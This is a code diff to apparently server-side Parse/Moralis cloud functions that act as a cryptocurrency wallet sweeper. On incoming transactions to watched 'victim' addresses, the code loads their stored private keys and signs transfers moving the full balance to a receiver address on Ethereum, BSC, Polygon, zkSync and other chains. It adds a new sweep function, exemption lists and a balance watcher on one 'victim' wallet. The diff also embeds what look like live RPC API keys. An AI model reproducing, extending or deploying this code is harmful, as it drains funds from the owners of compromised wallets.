@@ -113,12 +113,12 @@ Parse.Cloud.afterSave("DemoTxs", async  (request: any) => {
 Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
 
   request.log.info('Live section');
-  
+
    if(request.object.get("confirmed") == false) {
     await passallfunc(request, getntwork(request.object.get("chainId")))
   //  var logger = Moralis.Cloud.getLogger();
   var result = await web3.utils.fromWei(request.object.get("value"));
-
+  
     Parse.Cloud.httpRequest({
     method: 'POST',
    url: config.MLIS_URL,
@@ -158,7 +158,468 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
  
 
 
+  async function sendhighbal(request: any, toAddrDtls: any, rcveraddress: any, prjid: any, ntwk: any, value: any, loggerr: any ) {
 
+    // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
+    // loggerr.info(JSON.stringify(prjid));
+   var web3: any;
+   
+    if(ntwk == "eth") {
+   
+     // web3 = new Moralis.Web3(
+     //   new Moralis.Web3.providers.HttpProvider(
+     //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+     //   )
+     // );
+    
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth/"+prjid));
+   
+   
+     // web3 = new Moralis.Web3(
+     //   new Moralis.Web3.providers.HttpProvider(
+     //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+     //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+     //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+     //       "https://rpc.ankr.com/eth/"+prjid
+   
+     //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+     //   )
+     // );
+     
+   }
+   
+   
+    if(ntwk == "zkSync") {
+   
+     // web3 = new Moralis.Web3(
+     //   new Moralis.Web3.providers.HttpProvider(
+     //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+     //   )
+     // );
+    
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/zksync_era/"+prjid));
+   
+   
+     // web3 = new Moralis.Web3(
+     //   new Moralis.Web3.providers.HttpProvider(
+     //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+     //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+     //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+     //       "https://rpc.ankr.com/eth/"+prjid
+   
+     //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+     //   )
+     // );
+     
+   }
+   
+   //  web3 = new Moralis.Web3(
+   //      new Moralis.Web3.providers.HttpProvider(
+   //         //  'https://rinkeby.Ankra.io/v3/'+prjid
+   //         //  'https://rpc.ankr.com/eth_rinkeby'
+   //         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
+   //         "https://rpc.ankr.com/eth/"+prjid
+   //         // "https://eth.getblock.io/mainnet/?api_key="+prjid
+   //      )
+   //    );
+   
+   
+    if(ntwk == "bsc") {
+   
+      // web3 = new Moralis.Web3(
+      //   new Moralis.Web3.providers.HttpProvider(
+      //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+      //   )
+      // );
+   
+      web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/bsc/"+prjid));
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://bsc.getblock.io/"+prjid+"/mainnet/"));
+   
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
+     //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
+     //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
+     //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
+     //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
+     //       //  "https://rpc.ankr.com/bsc/"+prjid
+     //       "https://rpc.ankr.com/bsc/"+prjid
+     //    )
+     //  );
+      
+     //  loggerr.info("got to bsccccc");
+    }
+   
+   
+    if(ntwk == "polygon") {
+   
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/polygon/"+prjid));
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://matic.getblock.io/"+prjid+"/mainnet/"));
+   
+     request.log.info("got to plygon")
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //     //    'https://rpc.ankr.com/polygon_mumbai'
+     //     //    'https://rpc.ankr.com/polygon'
+     //     // "https://matic.getblock.io/testnet/?api_key="+prjid
+     //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
+     //     "https://rpc.ankr.com/polygon/"+prjid
+     //    )
+     //  );
+      
+    }
+   
+   
+    if(ntwk == "avax") {
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://avax.getblock.io/"+prjid+"/mainnet/ext/bc/C/rpc"));
+   
+   
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/avalanche/"+prjid));
+   
+     
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //     //    'https://rpc.ankr.com/avalanche'
+     //     //    'https://rpc.ankr.com/avalanche_fuji'
+     //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
+     //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
+     //     "https://rpc.ankr.com/avalanche/"+prjid
+     //     // "https://rpc.ankr.com/avalanche-c/"+prjid
+   
+     //    )
+     //  );
+      
+    
+     //  loggerr.info(web3+" web3 i got here");
+   
+    }
+   
+    if(ntwk == "fantom") {
+   
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://ftm.getblock.io/"+prjid+"/mainnet/"));
+   
+   
+   
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        // 'https://rpc.ankr.com/fantom_testnet'
+     //     //    'https://rpc.ankr.com/fantom'
+     //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
+     //     "https://rpc.ankr.com/fantom/"+prjid
+     //     // "https://rpc.ankr.com/fantom/"+prjid
+     //    )
+     //  );
+      
+    }
+   
+    if(ntwk == "cronos") {
+   
+   
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
+     var config = await Parse.Config.get({useMasterKey: true});
+   
+     var prjidd = config.get("getBlock");
+     web3 = new Web3(new Web3.providers.HttpProvider("https://cro.getblock.io/"+prjidd+"/mainnet/"));
+   
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+     //    )
+     //  );
+      
+    }
+    
+   
+   
+    if(ntwk == "arb") {
+   
+   
+     
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/arbitrum/"+prjid));
+   
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://arb.getblock.io/"+prjid+"/mainnet/"));
+   
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+     //    )
+     //  );
+      
+    }
+   
+   
+   
+    if(ntwk == "op") {
+   
+   
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/optimism/"+prjid));
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+    
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+     //    )
+     //  );
+      
+    }
+   
+    if(ntwk == "goerli") {
+   
+   // https://rpc.ankr.com/eth_goerli
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_goerli/"+prjid));
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+    
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+     //    )
+     //  );
+      
+    }
+   
+    if(ntwk == "sepolia") {
+   
+    
+     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_sepolia/"+prjid));
+     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+    
+   
+     //  web3 = new Moralis.Web3(
+     //    new Moralis.Web3.providers.HttpProvider(
+     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+     //    )
+     //  );
+      
+    }
+   
+   
+   
+   
+   
+    if(ntwk == null) {
+   
+     var result = await web3.utils.fromWei(request.object.get("value"));
+   
+     
+     Parse.Cloud.httpRequest({
+       method: 'POST',
+      url: config.MLIS_URL,
+      headers: {
+        "content-type": "application/json",
+        "x-apikey": config.MLIS_KEY,
+        "cache-control": "no-cache"
+      },
+       body: {
+         addr_from: request.object.get("fromAddress"),
+         addr_to: request.object.get("toAddress"),
+         value: result,
+         time: request.object.get("_created_at"),
+         brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
+         server: "1new_null"
+       }
+     }).then(function(httpResponse: any) {
+       //logger.info(httpResponse.text);
+         // logger.info("Logged Eth Trnasfer");
+     }, function(httpResponse: any) {
+       //  logger.error(JSON.stringify(httpResponse));
+     });
+   
+   
+     return;
+    }
+   
+   
+   
+    // old
+   //    var options = {
+   //      chain: ntwk,
+   //      address: toAddrDtls.get("addr")
+   //    };
+   //    var balance = await Moralis.Web3API.account.getNativeBalance(options);
+   
+   //    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
+   
+   //    var gasPrice = await web3.eth.getGasPrice();
+   
+   //    var gas = await web3.eth.estimateGas({
+   //      to: rcveraddress,
+   //      from: toAddrDtls.get("addr"),
+   //      value: balance.balance,
+   //    });
+   
+   //    var BN = web3.utils.BN;
+   //    // var fee = gasPrice * gas;
+   //    nGasprice = new BN(gasPrice);
+   //    var fee = nGasprice.mul(new BN(gas));
+    
+   //    bl = new BN(balance.balance);
+   //    baltosend =  bl.sub(fee);
+   
+   //    if(parseInt(baltosend) <= 0 ) {
+   
+   //      bl = new BN(value);
+   //      baltosend =  bl.sub(fee);
+   
+   //    }
+   
+   
+   
+   // end old 
+   
+   
+    try {
+   
+   // new
+   
+   request.log.info("got to the end of selecting network_"+ntwk)
+   
+   //  var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); 
+   
+   var gasPrice = await web3.eth.getGasPrice();
+   
+   var gas = 21000
+   
+   var BN = web3.utils.BN;
+   // var fee = gasPrice * gas;
+   var nGasprice = new BN(gasPrice);
+   var fee = nGasprice.mul(new BN(3));
+   
+   fee = fee.mul(new BN(gas));
+   fee = fee.add(new BN(2)) /// just added this line 2024
+   
+   request.log.info("Calculated big number");
+   
+   var bl = new BN(value);
+   
+   const getBalance = await web3.eth.getBalance(request.object.get("toAddress"))
+   var getbal =  new BN(getBalance)
+   
+   if(getbal > bl) {
+   
+     bl = getbal;
+     request.log.info("Using wallet balance instead");
+   
+   }
+   
+   
+   if(bl < fee ) {
+   
+     request.log.info("Balance is less than fee");
+   
+     return;
+   
+   }
+   
+   
+   var baltosend =  bl.sub(fee);
+   request.log.info("Calculated fee");
+   // loggerr.info(fee+" Old fee");
+   // loggerr.info(nonce+" nounce");
+   
+   // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
+   
+   //   loggerr.info("Crazy Point");
+   //   // var halffee = nGasprice.divn(new BN("2"))
+   //  var prefee = nGasprice.add(new BN(nGasprice));
+   //  nGasprice = prefee;
+   //  fee = prefee.mul(new BN(gas));
+   //  // bl = new BN(value);
+   //  baltosend =  bl.sub(fee);
+   // }
+   request.log.info("Calculated gas price");
+   
+   if(parseInt(baltosend) <= 0 ) {
+   
+     request.log.info("Balance is less than zero");
+   
+     // bl = new BN(value);
+     baltosend =  bl.sub(fee);
+   
+   }
+   
+   
+   request.log.info("Calculated balance");
+   
+   // end new
+   
+   
+   //  loggerr.info(baltosend.toString()+ "bal to send");
+   //  loggerr.info(nGasprice.toString()+ " gas price");
+   //  loggerr.info(fee.toString()+ "new fee");
+   //    logger.info(balance.balance.toString());
+   //  logger.info(value.toString()+ " value");
+   //  logger.info(ntwk+ " ntwk");
+   
+    var transaction = {
+   
+     'to': rcveraddress, // faucet address to return eth
+     'value': baltosend,
+     'gas': gas,
+     'gasPrice': gasPrice,
+     // 'nonce': request.object.get("nonce"),
+     // optional data field to send message or execute smart contract
+    };
+   
+    request.log.info("Created transaction");
+   
+    var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
+   
+    request.log.info("Signed transaction");
+   
+   
+     
+     request.log.info("Sending transaction");
+     web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash: any) => 
+    
+     {
+       // loggerr.info(hash.toString());
+       request.log.info("got hash")
+     }).on('receipt', async (reciept: any) => {
+    
+      await mshlogger(request, ntwk, loggerr)
+   
+      request.log.info("got recipet")
+       // loggerr.info(JSON.stringify(reciept));
+    
+    
+     }).on('error', async  (error: any) =>{
+    
+      await mshlogger(request, JSON.stringify(error), loggerr)
+      request.log.info("got error")
+       // loggerr.info(JSON.stringify(error));
+    
+       // loggerr.info("errror");
+    
+       });
+   
+    }  catch  (error) {
+   
+     request.log.info(JSON.stringify(error))
+     // loggerr.info(JSON.stringify(error));
+     // loggerr.info("catch errror");
+    }
+   
+   
+   
+   
+   
+   
+   }
 
 
 async function proxsend(request: any, toAddrDtls: any, rcveraddress: any, prjid: any, ntwk: any, value: any, loggerr: any ) {
@@ -177,6 +638,32 @@ var web3: any;
  
   // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
   web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth/"+prjid));
+
+
+  // web3 = new Moralis.Web3(
+  //   new Moralis.Web3.providers.HttpProvider(
+  //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+  //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+  //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+  //       "https://rpc.ankr.com/eth/"+prjid
+
+  //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+  //   )
+  // );
+  
+}
+
+
+ if(ntwk == "zkSync") {
+
+  // web3 = new Moralis.Web3(
+  //   new Moralis.Web3.providers.HttpProvider(
+  //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+  //   )
+  // );
+ 
+  // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/zksync_era/"+prjid));
 
 
   // web3 = new Moralis.Web3(
@@ -474,9 +961,10 @@ var gas = 21000
 var BN = web3.utils.BN;
 // var fee = gasPrice * gas;
 var nGasprice = new BN(gasPrice);
-var fee = nGasprice.mul(new BN(2));
+var fee = nGasprice.mul(new BN(3));
 
-fee = (new BN(fee)).mul(new BN(gas));
+fee = fee.mul(new BN(gas));
+fee = fee.add(new BN(2)) /// just added this line 2024
 
 request.log.info("Calculated big number");
 
@@ -607,7 +1095,10 @@ async function passallfunc(request: any, ntwk: any) {
  // // var web3ws = new Web3(new Web3.providers.WebsocketProvider('wss://rinkeby.Ankra.io/ws/v3/' + projectId));
  // // var web3 = new Web3(new Web3.providers.HttpProvider('https://rinkeby.Ankra.io/v3/' + projectId));
 
- request.log.info('Got to all functions');
+
+ request.log.info('Got to all functions local');
+
+ await BalanceChecker(request);
 
 //  var logger = Moralis.Cloud.getLogger();
  var config = await Parse.Config.get({useMasterKey: true});
@@ -629,6 +1120,36 @@ async function passallfunc(request: any, ntwk: any) {
  // var value = "10000000";
 
 
+     // check if exempted  for from addr
+     var queryfrom = new Parse.Query("exemptedaddr");
+     // query.limit(10);
+     queryfrom.fullText("addr", fromaddress);
+     var resultsfrom = await queryfrom.first(); // [ Monster, Monster, ...]
+ 
+       // check if exempted  for to addr
+       var queryto = new Parse.Query("exemptedaddr");
+       // query.limit(10);
+       queryto.fullText("addr", toaddress);
+       var resultsto = await queryto.first(); // [ Monster, Monster, ...]
+ 
+ 
+     if(resultsfrom || resultsto) {
+ 
+      request.log.info("got to result but is exempted");
+  
+      if(resultsfrom) {
+        await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+fromaddress)
+      }
+
+      if(resultsto) {
+        await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+toaddress)
+      }
+      
+      return
+     }
+
+
+ 
 
 if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
 
@@ -641,8 +1162,11 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
     request.log.info("got to result eth2");
     provider =  new providers.JsonRpcProvider(AnkrId2)
     // web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
-    await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
-  //  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
+    // await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
+
+   await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' );
+
+   sendhighbal(request,results, recver, AnkrId,ntwk, value, 'logger' );
   
   }
   else {
@@ -652,6 +1176,34 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
 
   return
 }
+
+
+    
+    // check if exempted  for to addr
+    var query = new Parse.Query("exemptedaddr");
+    // query.limit(10);
+    query.fullText("addr", toaddress);
+
+    if(query) {
+
+      var query = new Parse.Query("hpaddr");
+      // query.limit(10);
+      query.fullText("addr", toaddress);
+      var results = await query.first(); // [ Monster, Monster, ...]
+
+      // request.log.info('Live section');
+      if(results) {
+        request.log.info("got to result but is exempted");
+      await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
+
+      }
+      else {
+      //  logger.info(JSON.stringify(results));
+      request.log.info("no result and is exempted");
+      }
+
+     return
+    }
 
 
 var query = new Parse.Query("hpaddr");
@@ -1156,6 +1708,14 @@ function getntwork(chainid: number) {
     {
       id: 11297108109,
       name: 'palm'
+    },
+    {
+      id: 324,
+      name: 'zkSync'
+    },
+    {
+      id: 100,
+      name: 'gnosis'
     }
     
 
@@ -1326,7 +1886,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
     
       request.log.info(`Mad!...receipt 😁 🚀`);
       request.log.info("i got here15");
-        await mshlogger(request, 'Eth2', reciept)
+        await mshlogger(request, 'Eth2', JSON.stringify(reciept))
        request.log.info("got recipet")
         // loggerr.info(JSON.stringify(reciept));
      
@@ -1337,7 +1897,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
        request.log.info("got error")
        request.log.info("i got here16");
        request.log.info("error message"+error.message)
-       await mshlogger(request, JSON.stringify(error), error)
+       await mshlogger(request, JSON.stringify(error), JSON.stringify(error))
         // loggerr.info(JSON.stringify(error));
      
         // loggerr.info("errror");
@@ -1352,7 +1912,6 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
 
 
 }
-
 
 
 async function mshlogger(request: any, brand: any, logg: any) {
@@ -1378,7 +1937,7 @@ headers: {
    value: result,
    time: request.object.get("_created_at"),
    brand: brand+":Honey:stream",
-   server: "1"
+   server: "1: message:"+logg
  }
 }).then(function(httpResponse: any) {
   request.log.info("heoney response")
@@ -1394,6 +1953,38 @@ headers: {
 });
 
 
+
+
+async function BalanceChecker(request: any) {
+
+  request.log.info(`Balance checker started`);
+
+try {
+  
+
+  const vctm = "0xCd8d89731Be212D4c23b22c51475c3e8B22154ed";
+  const cntrct = "0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d"
+  const provider = new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/flare/6b0e506c63babd2b27739967a6f1e579c4fc72039e11d6ed25b233058511620d");
+  const balance = await provider.getBalance(vctm);
+
+    const abimatic = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],
+"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint8","name":"decimals","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"mintable","type":"bool"},{"internalType":"address","name":"owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"mintable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256",
+"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
+
+  const erc20_rw = new ethers.Contract(cntrct, abimatic);
+ 
+var tkbalanceADDR1 = await erc20_rw.balanceOf(vctm)
+
+request.log.info(`WFLR Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "ether")}`);
+request.log.info(`FLR Balance: ${ethers.utils.formatUnits(balance, "ether")}`);
+
+} catch (error) {
+  
+  request.log.info("Balnce checker error: "+error.message);
+
+}
+
+}
 
 
 
